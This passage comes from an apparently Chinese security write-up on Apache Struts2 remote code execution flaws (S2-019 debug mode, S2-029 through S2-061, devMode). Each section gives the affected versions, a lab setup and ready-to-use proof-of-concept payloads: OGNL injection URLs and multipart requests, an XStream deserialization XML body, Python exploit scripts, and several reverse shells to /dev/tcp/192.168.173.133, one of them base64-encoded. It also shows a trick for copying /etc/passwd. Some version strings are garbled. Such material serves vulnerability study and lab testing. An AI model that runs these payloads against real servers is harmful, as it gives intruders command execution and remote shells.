##### 要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把e xpression参数放到stack.findValue中，最终放到了ognl.getValue中。

#### 影响版本

```php
Struts 2.0.0 - 2.3.15.1
```

#### 启动漏洞

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3572bc2704885b07e5e278e5d6e22144f834e25.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3f4df60bfb6da9dece56f81b42e7cc344296981.png)

##### 验证漏洞是否存在 poc

```php
?debug=command&amp;e xpression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b)
,#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRe
sponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
```

##### 进行url编码之后

```php
?%64%65%62%75%67=%63%6f%6d%6d%61%6e%64&amp;%65%78%70%72%65%73%73%69%6f%6e=%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%69%64%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62=%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63=%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65=%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74=%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%27%64%62%61%70%70%3a%27%2b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29
```

![image-20210711141906515](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5c4e140da79d688c055ebb6c35e5625423815ce4.png)

### 4.11 S2-029远程代码执行漏洞

#### 漏洞原理

##### Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。

##### 在Struts2中，如下的标签就调用了OGNL进行取值

```php
&lt;p&gt;parameters: &lt;s:property value=&quot;#parameters.msg&quot; /&gt;&lt;/p&gt;
```

##### struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029依然是依靠OGNL进行远程代码执行。

#### 影响版本

```php
Struts 2.0.0 - 2.3.24.1ҁӧ۱ೡ2.3.20.3
```

#### 启动漏洞

![image-20210711142833577](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-21334bd4ecf30adfc0f2926c67133aea7d98dc44.png)

#### poc

```php
http://192.168.0.109:8889/default.action?message=(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtectedAccess%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAccess[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream()))
```

![image-20210711143443386](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66376f248db11b33d4b65f12e5c36aaee467cd91.png)

### 4.12 S2-032远程代码执行漏洞

#### 漏洞原理

##### 当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。 method:&lt;name&gt; Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。

#### 影响版本

```php
Struts 2.3.20-Struts Struts 2.3.28(2.3.20.3和2.3.24.3除外)
```

#### 启动漏洞

![image-20210711144332238](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ed753846572eab6ac4b0a4878e12ad9f76120ab6.png)

![image-20210711144420429](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e03d1652f20bf41ae74f0e40fd80b7bc6123c27c.png)

#### poc-1

```php
http://192.168.0.109:8080/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10010
```

![image-20210711144753479](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0b69935ea4ccd1412cf0594f630c4bf20127e73e.png)

##### 返回1001060253718则代表可代码执行！

#### poc-2（查看id）

```php
http://192.168.0.109:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id
```

![image-20210711144938819](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d240d3597701bda2db5fcf3253aed7ea1edaceca.png)

#### poc-3（创建文件夹）

```php
http://192.168.0.109:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=touch%20/tmp/zcc
```

![image-20210711145130656](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3097abd71ca7c4880133e6f6d0d32ce808ab8af.png)

### 4.13 S2-045远程代码执行漏洞

#### 漏洞原理

##### 在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行。恶意用户可在上传文件时通过修改HTTP请求头中的Content—Type值来触发该漏洞，进而执行系统命令。

#### 影响版本

```php
Struts2.3.5 – 2.3.31
Struts2.5 – 2.5.10
```

#### 启动漏洞

![image-20210711150010054](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-78ca1634b230c29c5db46895b0b43cc5d41c82b4.png)

![image-20210711150027817](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-726d718546b02c893bdce1f2e45bad467615194a.png)

#### poc-1

```php
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*5000)).(#ros.flush())}
```

![image-20210711150314872](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc8f750de0f85ab316fb542a0007ab2894af90fa.png)

#### poc-2

```php
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',11*11)}.multipart/form-data
```

![image-20210711150418468](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4a474cc3ee9c5d9ee38637725fa09890feab7037.png)

### 4.14 S2-046远程代码执行漏洞

#### 漏洞原理

##### 攻击者通过设置Content-Disposition的filename字段或者设置Content-Length超过2G这两种方式来触发异常并导致filename字段的OGNL表达式得到执行从而达到远程攻击的目的。该漏洞与045漏洞成因一样，只是漏洞利用的字段发生了改变。

##### 与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。

#### 影响版本

```php
Struts 2.3.5-Struts 2.3.31҅Struts 2.5-Struts 2.5.10
```

#### 启动漏洞

![image-20210711153613572](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-04586a1899e0816f893cf246ebb875fedd1d8b1b.png)

![image-20210711153651274](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3f5242c7aff266c8b21de3692bcab7df4e0f29a8.png)

#### poc-1，在filename=""处填上

```php
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}\x00b
```

![image-20210711153842625](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e6076d558352df641da6a91c5ba0f46b0a63ecf.png)

##### 找到b之前的字符，进行00截断

![image-20210711154116137](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1bbc13085b4e0d81b6126e40acf224f4532af66e.png)

##### 可以看到POC中算式执行成功。

#### poc-2,反弹shell，同样需要进行00截断。

```php
&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i &gt;&amp; /dev/tcp/192.168.173.133/9899 0&gt;&amp;1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b&quot;
```

![image-20210711171118416](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-79b9ef469ef54c4380adef1e62db02defce33254.png)

### 4.15 S2-048远程代码执行漏洞

#### 漏洞原理

##### Apache Struts2 2.3.x 系列启用了struts2-struts1-plugin 插件并且存在 struts2-showcase 目录,其漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接传递后处理不当导致任意代码执行。

#### 影响版本

```php
Apache Struts 2.3.xᔮڜӾސአԧstruts2-struts1-pluginൊկጱᇇ๜
```

#### 启动漏洞

![image-20210711174232049](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-41da2112174cdd422c45c2746845ce96de480f6f.png)

![image-20210711174420283](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cda6069639b0a7c5f7d192dc8d71ada83adab7a7.png)

#### poc-1

```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

![image-20210711195031238](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-032f081ccae8cd668d07bb93f9e9db787e4a1df4.png)

![image-20210711195105694](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4595434d01026399e7ee55a3014c7f3dc64efff2.png)

#### poc-2 反弹shell

```php
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i &gt;&amp; /dev/tcp/192.168.173.133/8888 0&gt;&amp;1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b&quot;
```

![image-20210711195527888](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e9604deb41ec8568d96ae9a11d1b9833a331e98c.png)

### 4.16 S2-052远程代码执行漏洞

#### 漏洞原理

##### Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对x ml格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。

#### 影响版本

```php
Struts 2.1.2 - Struts 2.3.33
Struts 2.5 - Struts 2.5.12
```

#### 启动漏洞

![image-20210711200028566](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ce7dacedf7db522d886c9411f5f82e8950c8657d.png)

![image-20210711200209092](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-086b1945a64e73465e894ccec980eaff934500ea.png)

#### poc-1

```php
&lt;map&gt;
 &lt;entry&gt;
 &lt;jdk.nashorn.internal.o bjects.NativeString&gt;
 &lt;flags&gt;0&lt;/flags&gt;
 &lt;value class=&quot;com.sun.x ml.internal.bind.v2.runtime.unmarshaller.B ase64Data&quot;&gt;
 &lt;dataHandler&gt;
 &lt;dataSource class=&quot;com.sun.x ml.internal.ws.encoding.x ml.x mlMessage$x mlDataSource&quot;&gt;
 &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
 &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
 &lt;initialized&gt;false&lt;/initialized&gt;
 &lt;opmode&gt;0&lt;/opmode&gt;
 &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
 &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
 &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
 &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
 &lt;command&gt;
 &lt;string&gt;touch&lt;/string&gt;
 &lt;string&gt;/tmp/success&lt;/string&gt;
 &lt;/command&gt;
 &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
 &lt;/next&gt;
 &lt;/iter&gt;
 &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
 &lt;method&gt;
 &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
 &lt;name&gt;start&lt;/name&gt;
 &lt;parameter-types/&gt;
 &lt;/method&gt;
 &lt;name&gt;foo&lt;/name&gt;
 &lt;/filter&gt;
 &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
 &lt;/serviceIterator&gt;
 &lt;lock/&gt;
 &lt;/cipher&gt;
 &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
 &lt;ibuffer&gt;&lt;/ibuffer&gt;
 &lt;done&gt;false&lt;/done&gt;
 &lt;ostart&gt;0&lt;/ostart&gt;
 &lt;ofinish&gt;0&lt;/ofinish&gt;
 &lt;closed&gt;false&lt;/closed&gt;
 &lt;/is&gt;
 &lt;consumed&gt;false&lt;/consumed&gt;
 &lt;/dataSource&gt;
 &lt;transferFlavors/&gt;
 &lt;/dataHandler&gt;
 &lt;dataLen&gt;0&lt;/dataLen&gt;
 &lt;/value&gt;
 &lt;/jdk.nashorn.internal.o bjects.NativeString&gt;
 &lt;jdk.nashorn.internal.o bjects.NativeString reference=&quot;../jdk.nashorn.internal.o bjects.NativeString&quot;/&gt;
 &lt;/entry&gt;
 &lt;entry&gt;
 &lt;jdk.nashorn.internal.o bjects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.o bjects.NativeString&quot;/&gt;
 &lt;jdk.nashorn.internal.o bjects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.o bjects.NativeString&quot;/&gt;
 &lt;/entry&gt;
&lt;/map&gt;
```

![image-20210711200351962](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a1fee7d7d2fda98030ab7f9adf321206848ea942.png)

##### 这里包头content-type修改为application-x ml

![image-20210711200608677](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2fd1afa84ec500329a7f607158c62aca16ce718d.png)

![image-20210711200639609](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5dd4a1dcb81ea8258224f61a75257679117ec88c.png)

![image-20210711200713281](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-219349a156f128bba7a4db074dfd717bcedfb4ac.png)

##### 小技巧

```php
读文件
&lt;command&gt; &lt;string&gt;cp&lt;/string&gt; &lt;string&gt;/etc/passwd&lt;/string&gt; &lt;string&gt;/tmp/passwd&lt;/string&gt; &lt;/command&gt;
写文件
&lt;command&gt;
&lt;string&gt;bash&lt;/string&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;string&gt;echo dayu hello &gt; /tmp/dayu.txt&lt;/string&gt;
&lt;/command&gt;
```

### 4.17 S2-053远程代码执行漏洞

#### 漏洞原理

##### Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次之后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

#### 影响版本

```php
Struts 2.0.1-2.3.33
Struts 2.5-2.5.10
```

#### 启动漏洞

![image-20210711201400818](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66a8422d3c2008db9c9c8f7b1cec9883d0d59e7f.png)

![image-20210711201449481](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d272272de1e2b129ec6b7f841422d5f6bd77a35e.png)

#### poc-1

```php
redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A
```

![image-20210711201616445](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a239dc6426594056a741cf5b5ed1d0e5eda95d1b.png)

##### poc-2

```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i &gt;&amp; /dev/tcp/192.168.173.133/8889 0&gt;&amp;1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

![image-20210711203146633](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b16c604d8631855ef22004f4bbc650b2bb890e52.png)

### 4.18 S2-059远程代码执行漏洞

#### 漏洞原理

##### Apache Struts框架，会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签睡醒时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程代码执行！

#### 影响版本

```php
Struts 2.0.0 - Struts 2.5.20
```

#### 启动漏洞

![image-20210711210933003](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0f5a0ceda579181a66e4062aeccadc39c9be4832.png)

![image-20210711211155033](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ae8e0bea705527524822121b9bb9ab073e77d628.png)

##### 验证漏洞是否存在

![image-20210711211356657](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66000fc147966d2a04dc66bb21ba79b596443cdf.png)

##### poc-1

```php
%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d
```

![image-20210711212245546](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3cd14da58525665a249c0c365b7f0358e0ddaa08.png)

##### poc-2 ，python2环境下执行

```php
import requests
url = &quot;http://127.0.0.1:8080&quot;
data1 = {
 &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}&quot;
}
data2 = {
 &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}&quot;
}
res1 = requests.post(url, data=data1)
# print(res1.text)
res2 = requests.post(url, data=data2)
# print(res2.text)
```

![image-20210711213340974](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20811e900a89d5d3989902ca8bb3631a9c0a600c.png)

![image-20210711213331656](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-04693669905f59d1f2b8a5a2647dd38cadd7dc83.png)

##### poc-3，反弹shell

```php
B ase64编码网址：
http://www.jackson-t.ca/runtime-exec-payloads.html   
bash -i &gt;&amp; /dev/tcp/192.168.173.133/8889 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvODg4OSAwPiYx}|{B ase64,-d}|{bash,-i}
```

```php
import requests
url = &quot;http://192.168.173.144:8080&quot;
data1 = {
 &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}&quot;
}
data2 = {
 &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvODg4OSAwPiYx}|{B ase64,-d}|{bash,-i}'))}&quot;
}
res1 = requests.post(url, data=data1)
# print(res1.text)
res2 = requests.post(url, data=data2)
# print(res2.text)
```

![image-20210711214038448](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f2ff02b573b5482d659475cb62bc775b0d7a6cf9.png)

### 4.19 S2-061远程代码执行漏洞

#### 漏洞原理

##### Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞（CVE-2020-17530），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，而S2-061绕过了该沙盒。

#### 影响版本

```php
Struts 2.0.0 - Struts 2.5.25
```

#### 启动漏洞

![image-20210711214547707](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-938c3e9ce1f75519bd6ab7f29e4027099f31d90b.png)

![image-20210711214711634](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-df32a57b2eb368655d96222cc2cfae68244141b6.png)

##### poc-1

```php
POST /index.action HTTP/1.1
Host: 192.168.173.144:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+x ml,application/x ml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.173.144:8080/index.action
Cookie: JSESSIONID=node01k3pu3katilv7msftp5e7xu3u2.node0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 827

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=&quot;id&quot;

%{(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

![image-20210711215812966](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dcbd3393f3e8f2e2cfbe1fe65e99b78258a5d490.png)

##### poc-2 反弹shell

```php
B ase64编码网址：
http://www.jackson-t.ca/runtime-exec-payloads.html   
bash -i &gt;&amp; /dev/tcp/192.168.173.133/8889 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvODg4OSAwPiYx}|{B ase64,-d}|{bash,-i}
```

![image-20210711220203033](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1602eeb559c0f10ecf6c7ced46f206f4e19dd9ab.png)

##### 替换poc-1中的id位置即可。

### 4.20 S2-devMode远程代码执行漏洞

#### 漏洞原理

##### 当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。

#### 影响版本

```php
Struts 2.1.0--2.5.1，通杀Struts2所有版本
```

#### 启动漏洞

```php
docker pull medicean/vulapps:s_struts2_s2-devmode
```

![image-20210711220749755](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9a7910fccfe0a213c7c149a4175bef524104bd62.png)

```php
docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-devmode
docker ps
```

![image-20210711220953688](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d664f2e06a4b1b17a6117fa0f0efc1c840345c5f.png)

![image-20210711221011780](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bb63d2bcfffa7aefe2bd7c23467caf1bd57bce87.png)

#### poc

```php
/orders/new/?debug=browser&amp;o bject=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id
```

![image-20210711221128437](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1b01baa03933a34f84bcf401633b5f5eac1e7f1c.png)

##### k8

